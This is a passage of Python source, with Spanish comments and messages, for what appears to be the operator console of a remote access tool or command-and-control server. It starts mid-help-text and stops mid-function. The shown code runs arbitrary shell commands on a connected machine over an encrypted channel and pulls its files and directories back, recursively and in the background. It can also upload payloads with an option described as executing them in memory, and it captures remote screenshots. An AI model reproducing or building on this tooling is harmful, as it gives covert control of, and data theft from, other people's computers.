{B_CYAN}Cadena de Comandos:{RESET}
  {B_GREEN}comando1 && comando2{RESET}     -> Ejecuta comando2 solo si comando1 tuvo éxito
  {B_GREEN}comando1 || comando2{RESET}     -> Ejecuta comando2 solo si comando1 falló
  {B_GREEN}comando1 ; comando2{RESET}      -> Ejecuta comando2 siempre
  {B_GREEN}Ejemplo:{RESET} ls && get -r documentos/ && exit

{B_CYAN}Comandos Locales (Servidor):{RESET}
  {B_GREEN}!comando{RESET}                 -> Ejecuta comando en el servidor local
  {B_GREEN}!nano archivo.txt{RESET}        -> Edita archivo localmente con nano

{B_CYAN}Transferencia de Archivos:{RESET}
  {B_GREEN}get <archivo|dir> [-r] [-b]{RESET}  -> Descarga. -r recursivo, -b background
  {B_GREEN}put <archivo> [-r] [-b] [-exc]{RESET}-> Sube. -b background, -exc ejecuta en memoria
  {B_GREEN}get largo.bin -b{RESET}             -> Descarga en background, libera el prompt
  {B_GREEN}put backup.tar.gz -b{RESET}         -> Sube en background

{B_CYAN}Gestión de Transferencias:{RESET}
  {B_GREEN}transfers{RESET}                -> Lista todas las transferencias (activas y recientes)
  {B_GREEN}stop <ID>{RESET}               -> Cancela una transferencia (ej: stop T1)
  {B_GREEN}resume <archivo_local>{RESET}  -> Reanuda una descarga interrumpida
"""
                    print(help_client)
                    continue

                if command.lower() == "exit":
                    if session.pending_transfer:
                        print(f"{B_YELLOW}[!] Transferencia en progreso. Saliendo...{RESET}")
                    break


                # ── transfers ──────────────────────────────────────────────
                if command.lower() == "transfers":
                    print_transfers(show_done=True)
                    continue

                # ── stop <ID> ───────────────────────────────────────────────
                if command.lower().startswith("stop "):
                    tid = command.split(maxsplit=1)[1].strip().upper()
                    if not tid.startswith("T"):
                        tid = "T" + tid
                    if bg_cancel(tid):
                        print(f"{B_YELLOW}[{tid}] Señal de cancelación enviada{RESET}")
                    else:
                        xfer = bg_get(tid)
                        if xfer:
                            print(f"{B_YELLOW}[{tid}] La transferencia ya está: {xfer.status}{RESET}")
                        else:
                            print(f"{ALERT} {RED}Transferencia '{tid}' no encontrada{RESET}")
                    continue

                # ── resume <archivo_local> ──────────────────────────────────
                if command.lower().startswith("resume "):
                    local_f = command.split(maxsplit=1)[1].strip()
                    local_f = os.path.join(CURRENT_WORKING_DIR, local_f) if not os.path.isabs(local_f) else local_f
                    if not try_resume_transfer(session, cid, local_f):
                        print(f"{ALERT} {RED}No hay transferencia interrumpida para '{local_f}'{RESET}")
                        print(f"{B_CYAN}    (Necesita: {local_f}.partial  y  {local_f}.resume){RESET}")
                    continue

                # ==================== GET COMMAND ====================
                # ==================== GET COMMAND CON SOPORTE -r ====================
                if command.startswith("get "):
                    parts = command.split()
                    is_recursive  = "-r" in parts
                    is_background = "-b" in parts

                    if is_recursive:
                        parts.remove("-r")
                    if is_background:
                        parts.remove("-b")
                    
                    if len(parts) < 2:
                        print(f"{ALERT} {RED}Uso: get <archivo|directorio> [-r]{RESET}")
                        continue

                    target_name = " ".join(parts[1:])

                    # ── Background GET (archivo individual) ────────────────
                    if is_background and not is_recursive:
                        # Resolver ruta absoluta en el cliente para que sea inmune a cd
                        abs_r = send_command_and_wait_response(
                            session,
                            f"realpath '{target_name}' 2>/dev/null || readlink -f '{target_name}' 2>/dev/null || echo '{target_name}'",
                            timeout=10
                        )
                        if abs_r and abs_r.strip().startswith('/'):
                            target_name = abs_r.strip()
                        local_dest = os.path.join(CURRENT_WORKING_DIR, os.path.basename(target_name))
                        # ── Verificar sobrescritura ──────────────────────────
                        if os.path.exists(local_dest):
                            try:
                                _q = f"[!] '{os.path.basename(local_dest)}' ya existe. ¿Sobreescribir? [s/N]: "
                                resp = (prompt_session.prompt(_q) if (PROMPT_TOOLKIT_AVAILABLE and prompt_session) else input(_q)).strip().lower()
                            except (EOFError, KeyboardInterrupt):
                                resp = "n"
                            if resp not in ("s", "si", "sí", "y", "yes"):
                                print(f"{B_YELLOW}[!] Cancelado{RESET}")
                                continue
                        xfer = bg_start_get(session, cid, target_name, local_dest)
                        print(f"{B_CYAN}[{xfer.id}] GET '{target_name}' iniciado en background{RESET}")
                        print(f"{B_CYAN}    → 'transfers' para ver progreso  |  'stop {xfer.id}' para cancelar{RESET}")
                        continue
                    # ───────────────────────────────────────────────────────
                    
                    if is_recursive:
                        # ========== DESCARGA RECURSIVA ==========
                        try:
                            print(f"{B_CYAN}[INFO] Descargando directorio '{target_name}' recursivamente...{RESET}")
                            if not is_background:
                                print(f"{B_YELLOW}[!] Presiona Ctrl+C para cancelar  |  Añade -b para background{RESET}")

                            # ── 1. Resolver ruta ABSOLUTA del target en el cliente ──────
                            # Esto garantiza que los GET_FILE usen rutas absolutas y no
                            # fallen si el usuario hace cd después de lanzar el transfer.
                            abs_resp = send_command_and_wait_response(
                                session,
                                f"realpath '{target_name}' 2>/dev/null || readlink -f '{target_name}' 2>/dev/null || echo '{target_name}'",
                                timeout=10
                            )
                            target_abs = abs_resp.strip() if (abs_resp and abs_resp.strip().startswith('/')) else target_name

                            # ── 2. Listar archivos usando ruta absoluta ────────────────
                            list_cmd = f"find '{target_abs}' -type f 2>/dev/null"
                            file_list_response = send_command_and_wait_response(session, list_cmd, timeout=60)

                            if not file_list_response or not file_list_response.strip():
                                # Fallback: ls -1R
                                list_cmd2 = f"ls -1R '{target_abs}' 2>/dev/null"
                                file_list_response = send_command_and_wait_response(session, list_cmd2, timeout=30)

                            if not file_list_response or not file_list_response.strip():
                                print(f"{ALERT} {RED}Error: No se pudo listar '{target_name}' — "
                                      f"¿existe el directorio? ¿tiene permisos?{RESET}")
                                continue

                            # Parsear líneas → lista de rutas absolutas
                            raw_lines = [l.strip() for l in file_list_response.splitlines() if l.strip()]

                            remote_files = []
                            current_ls_dir = target_abs
                            for line in raw_lines:
                                if line.startswith('[') or line == "ERROR":
                                    continue
                                # Cabecera de directorio de ls -R (termina en :)
                                if line.endswith(':') and not line.startswith('/'):
                                    current_ls_dir = line[:-1]
                                    continue
                                if line.endswith(':') and line.startswith('/'):
                                    current_ls_dir = line[:-1]
                                    continue
                                if '/' in line or '.' in os.path.basename(line):
                                    if not line.startswith('/'):
                                        line = os.path.join(current_ls_dir, line)
                                    remote_files.append(line)
                                elif not line.endswith('/'):
                                    remote_files.append(os.path.join(current_ls_dir, line))
                            
                            # Usar target_abs como norma (para calcular rel_path en el worker)
                            target_name = target_abs

                            # Deduplicar preservando orden
                            seen = set()
                            remote_files = [f for f in remote_files
                                            if not (f in seen or seen.add(f))]

                            if not remote_files:
                                print(f"{ALERT} {RED}Error: Directorio vacío o sin archivos accesibles{RESET}")
                                continue

                            print(f"{B_CYAN}[INFO] {len(remote_files)} archivos encontrados{RESET}")

                            # ── 2. Estructura local ──────────────────────────────────
                            # Normalizamos target_name para extraer base correctamente
                            target_norm = target_name.rstrip('/\\')
                            base_name   = os.path.basename(target_norm)
                            local_base  = os.path.join(CURRENT_WORKING_DIR, base_name)
                            os.makedirs(local_base, exist_ok=True)

                            # ── Función interna de descarga ──────────────────────────
                            def _download_recursive_files(remote_files, local_base, target_norm,
                                                          session, cancel_check=None, silent=False):
                                downloaded = 0
                                failed     = 0
                                total      = len(remote_files)

                                for idx, remote_file in enumerate(remote_files, 1):
                                    if cancel_check and cancel_check():
                                        if not silent:
                                            print(f"\n{B_YELLOW}[!] Descarga cancelada{RESET}")
                                        else:
                                            bg_print(f"\n{B_YELLOW}[BG] Descarga recursiva cancelada "
                                                     f"({downloaded}/{total} completados){RESET}")
                                        break

                                    try:
                                        # Calcular ruta local relativa al directorio base
                                        # Normalizar remote_file respecto a target_norm
                                        if remote_file.startswith(target_norm + '/') or \
                                           remote_file.startswith(target_norm + os.sep):
                                            rel_path = remote_file[len(target_norm):].lstrip('/\\')
                                        else:
                                            rel_path = os.path.relpath(remote_file, target_norm)

                                        # Sanear: no permitir rutas que salgan del directorio
                                        if rel_path.startswith('..'):
                                            rel_path = os.path.basename(remote_file)

                                        local_file = os.path.join(local_base, rel_path)
                                        os.makedirs(os.path.dirname(local_file), exist_ok=True)

                                        # Tamaño para timeout dinámico
                                        size_resp = send_command_and_wait_response(
                                            session, f"FILE_SIZE {remote_file}", timeout=10)
                                        file_size   = 0
                                        dyn_timeout = 90
                                        if size_resp and size_resp.startswith("FILE_SIZE:"):
                                            try:
                                                file_size   = int(size_resp.split(":")[1])
                                                dyn_timeout = calculate_file_timeout(file_size)
                                            except Exception:
                                                pass

                                        sz_str = format_bytes(file_size) if file_size else "?"

                                        # ── Configurar destino ───────────────────────────
                                        session.expected_file      = os.path.basename(local_file)
                                        session.expected_file_dest = local_file
                                        session.file_event.clear()
                                        session.file_result = None

                                        if not send_encrypted_message(
                                                session.socket, f"GET_FILE {remote_file}",
                                                session.aes_key, timeout=10, session=session):
                                            if not silent:
                                                print(f"  [{idx}/{total}] ✗ {rel_path} ({sz_str})  {RED}[ERROR envío]{RESET}")
                                            else:
                                                bg_print(f"  [{idx}/{total}] ✗ {rel_path}  [ERROR envío]")
                                            failed += 1
                                            session.expected_file      = None
                                            session.expected_file_dest = None
                                            continue

                                        if session.file_event.wait(timeout=dyn_timeout):
                                            if session.file_result:
                                                if not silent:
                                                    print(f"  [{idx}/{total}] {B_GREEN}✓{RESET} {rel_path} ({sz_str})")
                                                downloaded += 1
                                            else:
                                                if not silent:
                                                    print(f"  [{idx}/{total}] {RED}✗{RESET} {rel_path} ({sz_str})  [FAIL]")
                                                failed += 1
                                        else:
                                            if not silent:
                                                print(f"  [{idx}/{total}] {YELLOW}⏱{RESET} {rel_path} ({sz_str})  [TIMEOUT]")
                                            session.expected_file_dest = None
                                            failed += 1

                                        session.expected_file      = None
                                        session.expected_file_dest = None

                                    except KeyboardInterrupt:
                                        if not silent:
                                            print(f"\n{B_YELLOW}[!] Cancelado por Ctrl+C{RESET}")
                                        break
                                    except Exception as e:
                                        if not silent:
                                            print(f"  [{idx}/{total}] {RED}[ERROR: {e}]{RESET}")
                                        else:
                                            logging.warning(f"[BG] Error descargando {remote_file}: {e}")
                                        failed += 1

                                return downloaded, failed

                            # ── 3. Ejecutar: síncrono o background ──────────────────
                            if is_background:
                                # Check de sobrescritura: listar archivos que ya existen
                                existing = []
                                for rf in remote_files[:]:
                                    if rf.startswith(target_norm + '/') or rf.startswith(target_norm + os.sep):
                                        rel = rf[len(target_norm):].lstrip('/\\')
                                    else:
                                        rel = os.path.relpath(rf, target_norm)
                                    if rel.startswith('..'):
                                        rel = os.path.basename(rf)
                                    lf = os.path.join(local_base, rel)
                                    if os.path.exists(lf):
                                        existing.append(rel)

                                if existing:
                                    n_exist = len(existing)
                                    examples = ", ".join(existing[:3]) + ("..." if n_exist > 3 else "")
                                    try:
                                        _q = f"[!] {n_exist} archivo(s) ya existen ({examples}). ¿Sobreescribir todos? [s/N]: "
                                        resp = (prompt_session.prompt(_q) if (PROMPT_TOOLKIT_AVAILABLE and prompt_session) else input(_q)).strip().lower()
                                    except (EOFError, KeyboardInterrupt):
                                        resp = "n"
                                    if resp not in ("s", "si", "sí", "y", "yes"):
                                        print(f"{B_YELLOW}[!] Cancelado{RESET}")
                                        continue

                                # Lanzar worker que usa file_event (cero prints intermedios)
                                cancel_flag = threading.Event()
                                tid = _bg_next_id()

                                xfer_stub            = BackgroundTransfer(tid, "get", cid,
                                                                           target_name, local_base)
                                xfer_stub.total_bytes = len(remote_files)
                                xfer_stub.cancel_evt  = cancel_flag
                                bg_register(xfer_stub)

                                t = threading.Thread(
                                    target=_bg_recursive_worker,
                                    args=(xfer_stub, session, remote_files, local_base, target_norm),
                                    daemon=True,
                                    name=f"BB-BG-RECUR-{tid}"
                                )
                                xfer_stub.thread = t
                                t.start()
                                print(f"{B_CYAN}[{tid}] Descarga recursiva iniciada en background "
                                      f"({len(remote_files)} archivos){RESET}")
                                print(f"{B_CYAN}    → 'transfers' para ver progreso  |  'stop {tid}' para cancelar{RESET}")
                            else:
                                # Síncrono: descarga aquí mismo
                                downloaded, failed = _download_recursive_files(
                                    remote_files, local_base, target_norm, session)
                                print(f"\n{B_GREEN}[+] Completado: {downloaded} ok, "
                                      f"{failed} fallidos → {local_base}{RESET}")

                        except KeyboardInterrupt:
                            print(f"\n{B_YELLOW}[!] Operación cancelada{RESET}")
                        except Exception as e:
                            print(f"{ALERT} {RED}Error en get -r: {e}{RESET}")
                            logging.exception("Error en get -r")

                        continue
                    
                    # TRANSFERENCIA DE ARCHIVO INDIVIDUAL
                    # Verificar existencia
                    print(f"{B_CYAN}[INFO] Verificando existencia de '{target_name}' en cliente...{RESET}")
                    exists_check = send_command_and_wait_response(session, f"FILE_EXISTS {target_name}", timeout=10)
                    
                    if exists_check and exists_check.startswith("FILE_NOT_FOUND"):
                        print(f"{ALERT} {RED}Error: El archivo '{target_name}' no existe en el cliente{RESET}")
                        continue
                    elif not exists_check:
                        print(f"{B_YELLOW}[!] No se pudo verificar existencia, continuando...{RESET}")
                    
                    # Obtener tamaño
                    size_response = send_command_and_wait_response(session, f"FILE_SIZE {target_name}", timeout=10)
                    file_size = 0
                    
                    if size_response and size_response.startswith("FILE_SIZE:"):
                        try:
                            file_size = int(size_response.split(":")[1])
                            if file_size == 0:
                                print(f"{ALERT} {RED}Error: El archivo está vacío o no existe{RESET}")
                                continue
                            dynamic_timeout = calculate_file_timeout(file_size)
                            print(f"{B_CYAN}[INFO] Archivo: {format_bytes(file_size)}, timeout: {dynamic_timeout:.1f}s{RESET}")
                        except Exception as e:
                            logging.exception(f"Error parseando tamaño de archivo: {e}")
                            dynamic_timeout = 90
                    else:
                        print(f"{ALERT} {RED}Error: No se pudo obtener tamaño del archivo{RESET}")
                        continue
                    
                    session.expected_file = target_name
                    session.file_event.clear()
                    session.file_result = None

                    if not send_encrypted_message(session.socket, f"GET_FILE {target_name}", session.aes_key, timeout=10, session=session):
                        print(f"{ALERT} {RED}Error enviando petición GET_FILE{RESET}")
                        session.expected_file = None
                        continue

                    print(f"{B_CYAN}[INFO] Esperando archivo...{RESET}")
                    
                    if session.file_event.wait(timeout=dynamic_timeout):
                        if session.file_result:
                            print(f"{B_GREEN}[+] Archivo '{target_name}' descargado{RESET}")
                        else:
                            print(f"{ALERT} {RED}Fallo al recibir el archivo{RESET}")
                    else:
                        print(f"{B_YELLOW}[!] Timeout esperando transferencia{RESET}")
                        session.expected_file = None
                    continue


                # ==================== PUT COMMAND - CON SOPORTE RECURSIVO ====================
                if command.startswith("put "):
                    parts = command.split()
                    is_recursive     = "-r"   in parts
                    execute_remotely = "-exc" in parts
                    is_background    = "-b"   in parts
                    
                    if is_recursive:
                        parts.remove("-r")
                    if execute_remotely:
                        parts.remove("-exc")
                    if is_background:
                        parts.remove("-b")
                    
                    if len(parts) < 2:
                        print(f"{ALERT} {RED}Uso: put <archivo|directorio> [-r] [-b] [-exc]{RESET}")
                        continue

                    file_name = " ".join(parts[1:])

                    # ── Background PUT (archivo individual) ───────────────
                    if is_background and not is_recursive:
                        file_path = os.path.join(CURRENT_WORKING_DIR, file_name) if not os.path.isabs(file_name) else file_name
                        if not os.path.isfile(file_path):
                            print(f"{ALERT} {RED}Archivo '{file_name}' no encontrado{RESET}")
                            continue
                        xfer = bg_start_put(session, cid, file_path, os.path.basename(file_name))
                        print(f"{B_CYAN}[{xfer.id}] PUT '{file_name}' iniciado en background{RESET}")
                        print(f"{B_CYAN}    → 'transfers' para ver progreso  |  'stop {xfer.id}' para cancelar{RESET}")
                        continue
                    # ─────────────────────────────────────────────────────
                    
                    if is_recursive:
                        # TRANSFERENCIA RECURSIVA DE DIRECTORIO
                        # Construir ruta completa
                        dir_path = os.path.join(CURRENT_WORKING_DIR, file_name) if not os.path.isabs(file_name) else file_name
                        
                        if not os.path.exists(dir_path):
                            print(f"{ALERT} {RED}El directorio '{file_name}' no existe{RESET}")
                            continue
                        
                        if not os.path.isdir(dir_path):
                            print(f"{ALERT} {RED}'{file_name}' no es un directorio. Usa 'put {file_name}' sin -r{RESET}")
                            continue
                        
                        if execute_remotely:
                            print(f"{B_YELLOW}[!] Flag -exc ignorado para directorios{RESET}")
                        
                        print(f"{B_CYAN}[INFO] Enviando directorio '{file_name}' recursivamente...{RESET}")
                        
                        # Enviar comando PUT_DIR_RECURSIVE
                        if not send_encrypted_message(session.socket, "PUT_DIR_RECURSIVE", 
                                                     session.aes_key, timeout=10, session=session):
                            print(f"{ALERT} {RED}Error enviando comando PUT_DIR_RECURSIVE{RESET}")
                            continue
                        
                        # Enviar directorio usando función de extensión
                        success = send_directory_recursive_to_client(session, dir_path)
                        
                        if success:
                            # Enviar mensaje final de éxito
                            send_encrypted_message(session.socket, "[SUCCESS] Directorio transferido", 
                                                 session.aes_key, timeout=10, session=session)
                            print(f"{B_GREEN}[+] Directorio '{file_name}' enviado completamente{RESET}")
                        else:
                            send_encrypted_message(session.socket, "[ERROR] Error en transferencia", 
                                                 session.aes_key, timeout=10, session=session)
                            print(f"{ALERT} {RED}Error durante transferencia del directorio{RESET}")
                        
                        continue
                    
                    # TRANSFERENCIA DE ARCHIVO INDIVIDUAL (código original)
                    # Construir ruta completa desde CURRENT_WORKING_DIR
                    file_path = os.path.join(CURRENT_WORKING_DIR, file_name) if not os.path.isabs(file_name) else file_name
                    
                    if not os.path.exists(file_path):
                        print(f"{ALERT} {RED}El archivo '{file_name}' no existe.{RESET}")
                        continue
                    
                    if os.path.isdir(file_path):
                        print(f"{ALERT} {RED}'{file_name}' es un directorio. Usa 'put -r {file_name}' para envío recursivo{RESET}")
                        continue

                    file_size = os.path.getsize(file_path)
                    dynamic_timeout = calculate_file_timeout(file_size)
                    
                    print(f"{B_CYAN}[INFO] Enviando '{file_name}' ({format_bytes(file_size)}, timeout: {dynamic_timeout:.1f}s)...{RESET}")

                    try:
                        if not send_file_to_client_direct(session, file_path, timeout=dynamic_timeout):
                            print(f"{ALERT} {RED}Error enviando el archivo{RESET}")
                            continue

                        print(f"{B_GREEN}[+] Archivo enviado, esperando confirmación...{RESET}")

                        cmd_str = f"PUT_FILE {os.path.basename(file_name)}"
                        if execute_remotely:
                            cmd_str += " -exc"

                        response = send_command_and_wait_response(session, cmd_str, timeout=dynamic_timeout)

                        if response:
                            print(f"{B_GREEN}[+] Respuesta del cliente:\n{response}{RESET}")
                        else:
                            print(f"{B_YELLOW}[!] Timeout esperando respuesta{RESET}")

                    except Exception as e:
                        print(f"{ALERT} {RED}Error durante PUT_FILE: {e}{RESET}")
                        logging.exception(f"Error en comando put para archivo {file_name}")
                    continue

                # ==================== SCREENSHOT COMMAND ====================
                if command.lower() in ["screenshot", "screen"]:
                    print(f"{B_CYAN}[INFO] Solicitando captura de pantalla...{RESET}")
                    
                    session.expected_file = None
                    session.file_event.clear()
                    session.file_result = None
                    
                    # Enviar comando SCREENSHOT
                    if not send_encrypted_message(session.socket, "SCREENSHOT", session.aes_key, timeout=10, session=session):
                        print(f"{ALERT} {RED}Error enviando comando SCREENSHOT{RESET}")
                        continue
                    
                    print(f"{B_CYAN}[INFO] Esperando captura de pantalla...{RESET}")
                    
                    # Esperar hasta 60 segundos para la captura
                    if session.file_event.wait(timeout=60):
                        if session.file_result:
                            print(f"{B_GREEN}[+] Captura de pantalla completada{RESET}")
                        else:
                            print(f"{ALERT} {RED}Fallo al recibir la captura de pantalla{RESET}")
                    else:
                        print(f"{B_YELLOW}[!] Timeout esperando captura de pantalla{RESET}")
                        session.expected_file = None
                    continue


                logging.debug(f"Enviando comando al cliente {cid}: {command}")

                response = send_command_and_wait_response(session, command, timeout=COMMAND_TIMEOUT)

                if response is None:
                    if session.pending_transfer:
                        print(f"{B_CYAN}[INFO] Transferencia en progreso...{RESET}")
                        continue
                    if not is_session_connected(session):
                        print(f"\n{ALERT} {RED}Conexión perdida con la sesión #{cid}.{RESET}")
                        break
                    else:
                        print(f"{B_YELLOW}[!] Timeout - no se recibió respuesta{RESET}")
                        continue

                print(response)

            except Exception as inner_e:
                logging.exception(f"Error en bucle interactivo sesión {cid}: {inner_e}")
                if not is_session_connected(session):
                    print(f"\n{ALERT} {RED}Conexión perdida.{RESET}")
                    break
                else:
                    print(f"{ALERT} {RED}Error: {inner_e}{RESET}")
                    continue

    finally:
        signal.signal(signal.SIGINT, orig_sigint)
        try:
            session.set_interactive(False)
        except Exception as e:
            logging.debug(f"Error en set_interactive(False): {e}")
        
        cleanup_session_history()
        
        logging.debug(f"Sesión {cid} limpiada tras salir de interact")

def send_file_to_client_direct(session, file_path, timeout=None):
    """Envía un archivo al cliente con compresión inteligente - CON NEGOCIACIÓN."""
    sock = session.socket
    aes_key = session.aes_key

    if not os.path.isfile(file_path):
        print(f"{ALERT} {RED}Archivo '{file_path}' no encontrado{RESET}")
        return False

    try:
        file_size = os.path.getsize(file_path)
        
        if timeout is None:
            timeout = calculate_file_timeout(file_size)
        
        # Decidir método de compresión - NEGOCIACIÓN DE CAPACIDADES
        use_zstd = False
        if file_size >= LARGE_FILE_THRESHOLD:
            # Solo usar zstd si AMBOS lados lo soportan
            if ZSTD_AVAILABLE and session.supports_zstd:
                use_zstd = True
                print(f"{B_CYAN}[INFO] Usando Zstandard (soportado por ambos lados){RESET}")
            elif ZSTD_AVAILABLE and not session.supports_zstd:
                print(f"{B_YELLOW}[!] Cliente no soporta Zstandard, usando zlib{RESET}")
            elif not ZSTD_AVAILABLE and session.supports_zstd:
                print(f"{B_YELLOW}[!] Servidor no tiene Zstandard, usando zlib{RESET}")
            else:
                print(f"{B_CYAN}[INFO] Usando zlib (ninguno tiene Zstandard){RESET}")
        
        # Calcular hash
        sha = hashlib.sha256()
        retry_count = 0
        while retry_count < FILE_VERIFICATION_RETRIES:
            try:
                with open(file_path, 'rb') as f:
                    for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                        sha.update(chunk)
                break
            except Exception as e:
                retry_count += 1
                if retry_count >= FILE_VERIFICATION_RETRIES:
                    print(f"{ALERT} {RED}Error calculando hash: {e}{RESET}")
                    logging.exception(f"Error calculando hash: {e}")
                    return False
                time.sleep(0.5)
        
        file_hash = sha.hexdigest()
        
        # Logging de inicio de transferencia
        start_time_total = time.time()

        # Enviar header
        header = f"SIZE {file_size} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key, timeout=timeout, session=session):
            print(f"{ALERT} {RED}Error enviando encabezado{RESET}")
            log_transfer("put", os.path.basename(file_path), file_size, file_hash, 
                        time.time() - start_time_total, False, "Error enviando header")
            return False

        start_time = time.time()
        bytes_sent = 0
        last_report_time = start_time
        last_report_bytes = 0
        
        # Preparar compresor si es necesario
        if use_zstd:
            try:
                cctx = zstd.ZstdCompressor(level=3)
            except Exception as e:
                logging.exception(f"Error creando compresor zstd: {e}")
                use_zstd = False
        
        with open(file_path, 'rb') as f:
            chunk_count = 0
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                
                # Comprimir
                flag = 0
                payload_chunk = chunk
                
                if use_zstd:
                    try:
                        comp = cctx.compress(chunk)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 2
                    except Exception as e:
                        logging.warning(f"Error comprimiendo con zstd: {e}")
                elif ENABLE_COMPRESSION:
                    try:
                        comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 1
                    except Exception as e:
                        logging.warning(f"Error comprimiendo con zlib: {e}")

                # Cifrar
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload_chunk, None)
                packet = bytes([flag]) + nonce + ct
                full_packet = struct.pack('!I', len(packet)) + packet
                
                # Enviar
                sock.settimeout(timeout)
                sock.sendall(full_packet)
                
                if session:
                    session.add_bytes_sent(len(full_packet), compressed=(flag > 0))
                
                bytes_sent += len(chunk)
                chunk_count += 1
                
                # Actualizar barra de progreso
                current_time = time.time()
                if current_time - last_report_time >= 0.5:
                    elapsed = current_time - start_time
                    speed = (bytes_sent - last_report_bytes) / (current_time - last_report_time) if (current_time - last_report_time) > 0 else 0
                    eta = estimate_time_remaining(file_size - bytes_sent, speed)
                    
                    show_progress_bar(
                        bytes_sent, 
                        file_size, 
                        width=40,
                        prefix=f'{format_bytes(bytes_sent)}/{format_bytes(file_size)}',
                        suffix=f'{format_speed(speed)} | ETA: {eta}'
                    )
                    
                    last_report_time = current_time
                    last_report_bytes = bytes_sent

        # Completar barra
        show_progress_bar(file_size, file_size, width=40, 
                         prefix=f'{format_bytes(file_size)}/{format_bytes(file_size)}', 
                         suffix='Completado')

        elapsed = time.time() - start_time_total
        avg_speed = bytes_sent / elapsed if elapsed > 0 else 0
        
        print(f"{B_GREEN}[+] Transferencia completada en {elapsed:.1f}s ({format_speed(avg_speed)}){RESET}")
        
        # Log
        log_transfer("put", os.path.basename(file_path), file_size, file_hash, elapsed, True)
        
        return True
        
    except Exception as e:
        print(f"\n{ALERT} {RED}Error enviando archivo: {e}{RESET}")
        logging.exception("Error al enviar archivo: %s", e)
        log_transfer("put", os.path.basename(file_path), file_size if 'file_size' in locals() else 0, 
                     file_hash if 'file_hash' in locals() else "unknown", 
                     time.time() - start_time_total if 'start_time_total' in locals() else 0, 
                     False, str(e))
        return False

def receive_screenshot_stream(session, screenshot_name, header_text):
    """Recibe una captura de pantalla desde el cliente."""
    sock = session.socket
    aes_key = session.aes_key
    
    try:
        parts = header_text.split()
        file_size, expected_hash = int(parts[1]), parts[2]
        
        timeout = calculate_file_timeout(file_size)
        
        # Guardar con timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_filename = f"screenshot_{timestamp}.bmp"
        out_path = os.path.join(CURRENT_WORKING_DIR, out_filename)
        
        start_time_total = time.time()
        received = 0
        sha = hashlib.sha256()
        start_time = time.time()
        last_report_time = start_time
        last_report_bytes = 0
        
        print(f"{B_CYAN}[INFO] Recibiendo captura de pantalla ({format_bytes(file_size)})...{RESET}")
        
        with open(out_path, 'wb') as f:
            while received < file_size:
                # Recibir chunk
                raw_len = recvall(sock, 4, timeout=timeout)
                if not raw_len:
                    print(f"\n{ALERT} {RED}Error: Conexión perdida{RESET}")
                    return False
                    
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(sock, packet_len, timeout=timeout)
                if not packet or len(packet) < 13:
                    print(f"\n{ALERT} {RED}Error: Chunk inválido{RESET}")
                    return False
                
                # Descifrar
                flag = packet[0]
                
                if session:
                    session.add_bytes_received(4 + packet_len, compressed=(flag > 0))
                
                nonce = packet[1:13]
                ct = packet[13:]

                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
                
                # Descomprimir si está comprimido
                if flag == 1:  # zlib
                    try:
                        chunk = zlib.decompress(chunk)
                        if session:
                            session.supports_compression = True
                    except Exception as e:
                        print(f"\n{ALERT} {RED}Error descomprimiendo{RESET}")
                        logging.exception(f"Error descomprimiendo zlib: {e}")
                        return False

                # Escribir y actualizar hash
                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)
                
                # Progreso
                current_time = time.time()
                if current_time - last_report_time >= 0.5:
                    elapsed = current_time - start_time
                    speed = (received - last_report_bytes) / (current_time - last_report_time) if (current_time - last_report_time) > 0 else 0
                    eta = estimate_time_remaining(file_size - received, speed)
                    
                    show_progress_bar(
                        received, 
                        file_size, 
                        width=40,
                        prefix=f'{format_bytes(received)}/{format_bytes(file_size)}',
                        suffix=f'{format_speed(speed)} | ETA: {eta}'
                    )
                    
                    last_report_time = current_time
                    last_report_bytes = received

        # Completar barra
        show_progress_bar(file_size, file_size, width=40, 
                         prefix=f'{format_bytes(file_size)}/{format_bytes(file_size)}', 
                         suffix='Completado')

        # Verificar integridad
        actual_hash = sha.hexdigest()
        elapsed = time.time() - start_time_total
        
        if received != file_size:
            print(f"{ALERT} {RED}Error: Tamaño incorrecto (recibido: {format_bytes(received)}, esperado: {format_bytes(file_size)}){RESET}")
            return False
        
        if actual_hash != expected_hash:
            print(f"{ALERT} {RED}Error: Hash no coincide{RESET}")
            print(f"  Esperado: {expected_hash}")
            print(f"  Recibido: {actual_hash}")
            return False

        avg_speed = received / elapsed if elapsed > 0 else 0
        
        print(f"{B_GREEN}[+] Captura de pantalla recibida en {elapsed:.1f}s ({format_speed(avg_speed)}){RESET}")
        print(f"{B_GREEN}[+] Guardado: {out_path}{RESET}")
        
        log_transfer("screenshot", out_filename, file_size, expected_hash, elapsed, True)
        
        return True

    except Exception as e:
        print(f"\n{ALERT} {RED}Error recibiendo captura de pantalla: {e}{RESET}")
        logging.exception("Error en receive_screenshot_stream")
        return False

def receive_file_stream(session, file_name, header_text, timeout=60):
    """Recibe un archivo desde el cliente con soporte para Zstandard."""
    sock = session.socket
    aes_key = session.aes_key
    
    try:
        parts = header_text.split()
        file_size, expected_hash = int(parts[1]), parts[2]
        
        timeout = calculate_file_timeout(file_size)

        # Si el llamador fijó expected_file_dest, guardar directamente ahí
        # y suprimir TODOS los prints (barra de progreso y mensajes finales).
        # La descarga recursiva con -b gestiona sus propios logs desde el hilo worker.
        dest_override = session and getattr(session, 'expected_file_dest', None)
        if dest_override:
            out_path       = dest_override
            suppress_print = True   # sin barra ni mensajes de éxito/error
        else:
            out_path       = os.path.join(CURRENT_WORKING_DIR, os.path.basename(file_name))
            suppress_print = False
        
        # Preparar descompresor si es archivo grande y tenemos zstd
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            try:
                dctx = zstd.ZstdDecompressor()
                if not suppress_print:
                    print(f"{B_CYAN}[INFO] Archivo grande, preparado para Zstandard{RESET}")
            except Exception as e:
                logging.exception(f"Error creando descompresor zstd: {e}")
                use_zstd = False
        
        start_time_total = time.time()
        received = 0
        sha = hashlib.sha256()
        start_time = time.time()
        last_report_time = start_time
        last_report_bytes = 0
